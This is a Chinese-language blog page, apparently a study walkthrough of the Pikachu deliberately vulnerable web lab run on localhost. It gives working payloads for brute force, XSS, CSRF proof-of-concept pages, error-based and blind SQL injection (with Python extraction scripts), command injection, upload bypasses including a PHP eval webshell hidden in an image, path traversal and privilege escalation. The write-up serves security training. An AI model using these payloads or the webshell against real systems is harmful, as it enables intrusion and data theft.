@@ -1,0 +1,356 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pikachu（待完善） | StarWhale</title><meta name="author" content="StarWhale"><meta name="copyright" content="StarWhale"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="爆破.taltcdwwxlls{zoom: 25%;}   on server：无条件不刷新，与上题解法相同  on client：前端验证验证码，把JavaScript关掉即可  token防爆破：返回包藏着下一次使用的token，使用音叉模式，在resource pool里把线程数改为1，在爆破结果页面的setting选项里的Grep-Match里添加success字样，（因为音叉与集束爆破不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu（待完善）">
+<meta property="og:url" content="http://example.com/2025/06/17/pikachu/index.html">
+<meta property="og:site_name" content="StarWhale">
+<meta property="og:description" content="爆破.taltcdwwxlls{zoom: 25%;}   on server：无条件不刷新，与上题解法相同  on client：前端验证验证码，把JavaScript关掉即可  token防爆破：返回包藏着下一次使用的token，使用音叉模式，在resource pool里把线程数改为1，在爆破结果页面的setting选项里的Grep-Match里添加success字样，（因为音叉与集束爆破不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/%E6%A2%97%E5%B0%8F%E5%A7%90.png">
+<meta property="article:published_time" content="2025-06-16T16:06:25.177Z">
+<meta property="article:modified_time" content="2025-06-25T08:59:00.850Z">
+<meta property="article:author" content="StarWhale">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/%E6%A2%97%E5%B0%8F%E5%A7%90.png"><link rel="shortcut icon" href="/img/%E6%A2%97%E5%B0%8F%E5%A7%90.png"><link rel="canonical" href="http://example.com/2025/06/17/pikachu/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.2.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'pikachu（待完善）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/%E6%A2%97%E5%B0%8F%E5%A7%90.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/%E6%A2%97%E5%B0%8F%E5%A7%90.png" alt="Logo"><span class="site-name">StarWhale</span></a><a class="nav-page-title" href="/"><span class="site-name">pikachu（待完善）</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我们</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">pikachu（待完善）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-16T16:06:25.177Z" title="发表于 2025-06-17 00:06:25">2025-06-17</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-25T08:59:00.850Z" title="更新于 2025-06-25 16:59:00">2025-06-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a><strong>爆破</strong></h1><style>.taltcdwwxlls{zoom: 25%;}</style><img src="/2025/06/17/pikachu/1.png" class="taltcdwwxlls">
+
+<ul>
+<li><p><strong>on server：</strong>无条件不刷新，与上题解法相同</p>
+</li>
+<li><p><strong>on client：</strong>前端验证验证码，把<strong>JavaScript</strong>关掉即可</p>
+</li>
+<li><p><strong>token防爆破：</strong>返回包藏着下一次使用的token，使用<strong>音叉模式</strong>，在resource pool里把线程数改为1，在爆破结果页面的setting选项里的Grep-Match里添加<strong>success</strong>字样，（因为音叉与集束爆破不同，音叉只会爆破行号对应的账号密码，不像集束爆破组合所有可能，所以这里没有爆破出所有账号密码）</p>
+<style>.qhjntjnbvvbl{zoom:25%;}</style><img src="/2025/06/17/pikachu/2.png" class="qhjntjnbvvbl"></li>
+</ul>
+<h1 id="XSS-反射性XSS-存储型XSS-DOM型XSS"><a href="#XSS-反射性XSS-存储型XSS-DOM型XSS" class="headerlink" title="XSS:反射性XSS;存储型XSS;DOM型XSS"></a><strong>XSS:反射性XSS;存储型XSS;DOM型XSS</strong></h1><ul>
+<li><p><strong>get反射型：</strong><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>: <code>&lt;script&gt;</code>是<strong>HTML <strong>中用于嵌入</strong>JavaScript</strong>代码的容器,<code>alert(1)</code>弹出一个包含文本 1 的对话框，将页面源码限制字节数改大即可注入</p>
+<style>.vopvlowilxqc{zoom:25%;}</style><img src="/2025/06/17/pikachu/3.png" class="vopvlowilxqc">
+</li>
+<li><p><strong>post反射型：</strong>同上</p>
+</li>
+<li><p><strong>存储型XSS：</strong>同上，<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>后每次访问页面都会跳出弹窗</p>
+</li>
+<li><p><strong>DOM型XSS：</strong>两题一致</p>
+<ul>
+<li>以 <code>javascript:</code> 开头的 URL 会被浏览器解析为 JavaScript 代码并执行</li>
+</ul>
+<style>.wrgllnsrfwht{zoom:25%;}</style><img src="/2025/06/17/pikachu/4.png" class="wrgllnsrfwht">
+
+<ul>
+<li>用<code>&#39;</code>与前面闭合后注入代码也可以,payload：<code>&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;</code>，注入后代码变为<code>&lt;a href=&#39;&#39; onclick=&quot;alert(&#39;xss&#39;)&quot;&gt;&#39;&gt;what do you see?&lt;/a&gt;</code>，原本的<code>&#39;&gt;</code>变为显示文本的一部分</li>
+</ul>
+<style>.sbfznpdolioh{zoom:25%;}</style><img src="/2025/06/17/pikachu/26.png" class="sbfznpdolioh">
+</li>
+<li><p><strong>XSS盲打：</strong>数据在后台</p>
+<style>.uvpjgdkgfcwx{zoom:25%;}</style><img src="/2025/06/17/pikachu/5.png" class="uvpjgdkgfcwx">
+</li>
+<li><p><strong>XSS过滤：</strong><code>&lt;Script&gt;alert(1)&lt;/Script&gt;</code>，大小写绕过</p>
+</li>
+<li><p><strong>XSS htmlspecialchars：</strong><code>javascript:alert(1)</code>或<code>&#39; onclick=&#39;alert(&quot;1&quot;)</code>，后者的<code>&#39;</code>用于与前后的单引号闭合</p>
+</li>
+<li><p><strong>XSS href：</strong>单双引号都被过滤，只能<code>javascript:alert(1)</code></p>
+</li>
+<li><p><strong>XSS js：</strong><code>&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/script&gt;</code>，源代码夹在标签中，前后均闭合，中间注入自己的代码</p>
+</li>
+</ul>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a><strong>CSRF</strong></h1><ul>
+<li><p><strong>get：</strong></p>
+<ul>
+<li><p>法1：<code>127.0.0.1/pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=1&amp;phonenum=1&amp;add=1&amp;email=1&amp;submit=submit</code>，将这个链接改为短链接诱骗受害者点击</p>
+</li>
+<li><p>法2：伪装404页面</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/DVWA/vulnerabilities/csrf/?password_new=1&amp;password_conf=1&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p><strong>post：</strong>直接用<strong>burpsuite</strong>生成html源码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://127.0.0.1/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;phonenum&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;add&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h1><ul>
+<li><p><strong>数字型：</strong>裸参数</p>
+<style>.ggekzmoomtvl{zoom:25%;}</style><img src="/2025/06/17/pikachu/6.png" class="ggekzmoomtvl">
+</li>
+<li><p><strong>字符型：</strong></p>
+<style>.jdebouodvpxr{zoom:25%;}</style><img src="/2025/06/17/pikachu/7.png" class="jdebouodvpxr">
+</li>
+<li><p><strong>搜索型：</strong><code>1&#39; or 1=1%23</code></p>
+</li>
+<li><p><strong>xx型：</strong>不断尝试各种闭合类型</p>
+<style>.klohudoxeexa{zoom:25%;}</style><img src="/2025/06/17/pikachu/8.png" class="klohudoxeexa">
+</li>
+<li><p><strong>insert&#x2F;update：</strong>登录页面输入被转义，无法注入</p>
+<style>.ukxqcvxbfrce{zoom:25%;}</style><img src="/2025/06/17/pikachu/9.png" class="ukxqcvxbfrce">
+
+<p>修改信息页面源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;update member set sex=&#x27;<span class="subst">&#123;$getdata[&#x27;sex&#x27;]&#125;</span>&#x27;,phonenum=&#x27;<span class="subst">&#123;$getdata[&#x27;phonenum&#x27;]&#125;</span>&#x27;,address=&#x27;<span class="subst">&#123;$getdata[&#x27;add&#x27;]&#125;</span>&#x27;,email=&#x27;<span class="subst">&#123;$getdata[&#x27;email&#x27;]&#125;</span>&#x27; where username=&#x27;<span class="subst">&#123;$_SESSION[&#x27;sqli&#x27;][&#x27;username&#x27;]&#125;</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>payload: <code>1&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;</code>，另一个等效payload:<code>1&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;</code>，这里遇到一个权限问题：<code>select schema_name from information_schema.schemata limit 0,1</code>无法注入，因为没有权限读取<strong>MySQL 的元数据系统表–information_schema.schemata</strong></p>
+</li>
+<li><p><strong>delete：</strong>payload: <code>99+or+updatexml(1,concat(0x7e,(select+database()),0x7e),1)</code></p>
+<style>.ptgdkwgvguee{zoom:25%;}</style><img src="/2025/06/17/pikachu/10.png" class="ptgdkwgvguee">
+
+<p>注入点在删除时发送的数据包，此时的id后台没有做转义处理</p>
+</li>
+<li><p><strong>http头：</strong>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span>=<span class="string">&quot;insert httpinfo(userid,ipaddress,useragent,httpaccept,remoteport) values(&#x27;<span class="subst">$is_login_id</span>&#x27;,&#x27;<span class="subst">$remoteipadd</span>&#x27;,&#x27;<span class="subst">$useragent</span>&#x27;,&#x27;<span class="subst">$httpaccept</span>&#x27;,&#x27;<span class="subst">$remoteport</span>&#x27;)&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>抓包时发现存在上述查询源码比对的数据之一——<strong>useragent</strong>，并且源码无转义</p>
+<style>.htyimfnmfxff{zoom:25%;}</style><img src="/2025/06/17/pikachu/11.png" class="htyimfnmfxff">
+
+<p>payload: <code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1) or &#39;</code></p>
+</li>
+<li><p><strong>布尔盲注：</strong><code>kobe&#39; and 1=1%23</code>和<code>kobe&#39; and 1=2%23</code>确定闭合方式为单引号，确定长度后粗略写一个脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">r&quot;C:\Users\StarWhale\AppData\Local\Programs\Python\Python312\Lib\site-packages&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbs</span>():</span><br><span class="line">    dbname = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            url = <span class="string">f&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&#x27; and ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span></span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;kobe&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">        dbname += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(dbname, low)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dbs()</span><br></pre></td></tr></table></figure>
+
+<style>.iqvdqjfkyksw{zoom:25%;}</style><img src="/2025/06/17/pikachu/12.png" class="iqvdqjfkyksw">
+</li>
+<li><p><strong>时间盲注：</strong>微调一下上面的脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.path.append(<span class="string">r&quot;C:\Users\StarWhale\AppData\Local\Programs\Python\Python312\Lib\site-packages&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbs</span>():</span><br><span class="line">    dbname = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">8</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            url = <span class="string">f&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&#x27; and if(ascii(substr((select database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(3),1)%23&amp;submit=%E6%9F%A5%E8%AF%A2&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            res = requests.get(url)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            <span class="keyword">if</span> end_time - start_time &gt; <span class="number">2</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">        dbname += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(dbname, low)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    dbs()</span><br></pre></td></tr></table></figure>
+
+<style>.ojnquvwwcfnc{zoom:25%;}</style><img src="/2025/06/17/pikachu/14.png" class="ojnquvwwcfnc">
+</li>
+<li><p><strong>宽字节注入：</strong></p>
+<style>.qfgcioklcsqa{zoom:25%;}</style><img src="/2025/06/17/pikachu/13.png" class="qfgcioklcsqa"></li>
+</ul>
+<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a><strong>RCE</strong></h1><ul>
+<li><p><strong>ping：</strong>payload: <code>127.0.0.1|dir</code></p>
+<style>.cugszrkpujnw{zoom:25%;}</style><img src="/2025/06/17/pikachu/15.png" class="cugszrkpujnw">
+</li>
+<li><p><strong>eval：</strong>payload: <code>phpinfo();</code></p>
+<style>.twcqznpuqpww{zoom:25%;}</style><img src="/2025/06/17/pikachu/16.png" class="twcqznpuqpww"></li>
+</ul>
+<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a><strong>File Inclusion</strong></h1><ul>
+<li><p><strong>local：</strong></p>
+<style>.upgdrktmgjcy{zoom:25%;}</style><img src="/2025/06/17/pikachu/17.png" class="upgdrktmgjcy">
+</li>
+<li><p><strong>remote：</strong>可以远程包含别的服务器上的文件，这里结合任意文件上传漏洞在本地进行：</p>
+<ul>
+<li><p><strong>client check：</strong>把网页的JavaScript关掉，然后上传<code>&lt;?php phpinfo();?&gt;</code></p>
+<style>.fspcvvxckusr{zoom:25%;}</style><img src="/2025/06/17/pikachu/18.png" class="fspcvvxckusr">
+</li>
+<li><p><strong>MIME type：</strong>burpsuite抓包，然后把<strong>Content-Type</strong>改为<strong>image&#x2F;jpeg</strong></p>
+</li>
+<li><p><strong>getimagesize：</strong><code>getimagesize</code>函数读取文件内容并解析其中的图像信息。该函数会返回一个数组，数组的第三个元素（<code>$info[2]</code>）是一个整数，代表文件实际的图像类型。</p>
+<p>解法：在正常的图片末尾追加木马<code>copy X.png/b + 111.txt 111_X/png</code>，111.txt里的内容为<code>&lt;?php phpinfo();@eval($_POST[&#39;X&#39;])?&gt;</code></p>
+<style>.urcvwuwlkhwd{zoom:25%;}</style><img src="/2025/06/17/pikachu/19.png" class="urcvwuwlkhwd"></li>
+</ul>
+</li>
+</ul>
+<h1 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a><strong>Unsafe Filedownload</strong></h1><ul>
+<li>抓包后在文件名处可以路径穿越</li>
+</ul>
+<h1 id="over-permission"><a href="#over-permission" class="headerlink" title="over permission"></a><strong>over permission</strong></h1><ul>
+<li><p><strong>水平越权：</strong></p>
+<style>.tabxvllzfval{zoom:25%;}</style><img src="/2025/06/17/pikachu/20.png" class="tabxvllzfval">
+</li>
+<li><p><strong>垂直越权：</strong>先登录admin账户抓包添加用户的操作，然后再抓一个登录pikachu账户的数据包，在<strong>添加用户的数据包</strong>中用pikachu的<strong>cookie</strong>替换admin的<strong>cookie</strong>，完成垂直越权</p>
+<style>.nshpdbebpbvm{zoom:25%;}</style><img src="/2025/06/17/pikachu/21.png" class="nshpdbebpbvm"></li>
+</ul>
+<h1 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a><strong>路径穿越</strong></h1><ul>
+<li><code>../</code>表示上级目录，<code>./</code>表示当前目录</li>
+</ul>
+<h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a><strong>敏感信息泄露</strong></h1><ul>
+<li>测试账号和密码藏在页面源码中</li>
+</ul>
